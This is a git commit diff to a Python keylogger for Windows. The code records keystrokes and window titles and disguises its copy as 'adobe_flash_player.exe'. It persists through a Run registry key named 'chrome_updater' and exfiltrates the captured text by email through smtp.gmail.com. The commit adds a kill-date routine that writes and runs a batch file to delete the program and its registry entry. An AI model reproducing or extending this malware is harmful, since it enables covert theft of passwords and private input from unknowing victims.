cf5b142aae6f6a8c2da3958db9ef913d1533b18a
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-12-18 18:01:30 +0500

    update log.py

--- Template/log.py
+++ Template/log.py
@@ -1,19 +1,19 @@
 from keyboard import on_press, wait
 from win32gui import GetWindowText, GetForegroundWindow
 import win32event, win32api, winerror
+from datetime import datetime
 from threading import Thread
 from time import sleep
-import datetime
 import smtplib
 import sys
 import shutil
 from winreg import *
-from os import path
+import os
 
 instance = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     instance = None
-    exit()
+    exit()    
 
 dir = r"C:\Users\Public\Libraries\adobe_flash_player.exe"
 
@@ -21,9 +21,23 @@ def startup():
     shutil.copy(sys.argv[0], dir)
     aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"chrome_updater_client", 0, REG_SZ, dir)    
-if not path.isfile(dir):
+    SetValueEx(aKey,"chrome_updater", 0, REG_SZ, dir)    
+if not os.path.isfile(dir):
     startup()   
+
+
+if (dst <= str(datetime.now())[:10]):
+    pth = r"del /q C:\Users\Public\Libraries\adobe_flash_player.exe"
+    dlt = r"del /q C:\Users\Public\Libraries\del.cmd"
+    f = open(r"C:\Users\Public\Libraries\del.cmd","w+")
+    f.write('''
+taskkill /f /im "adobe_flash_player.exe" ''' +  '\n' + pth + '\n' + '''
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v chrome_updater /f
+''' + '\n' + dlt)    
+    f.close()
+    os.system(r"C:\Users\Public\Libraries\del.cmd")
+else:
+    pass    
 
 
 data = ''
@@ -33,7 +47,7 @@ def send_mail():
     global data
     while True:
         if len(data) > 50:
-            timeInSecs = datetime.datetime.now()
+            timeInSecs = datetime.now()
             SERVER = "smtp.gmail.com"
             PORT = 587
             PASS = PAS
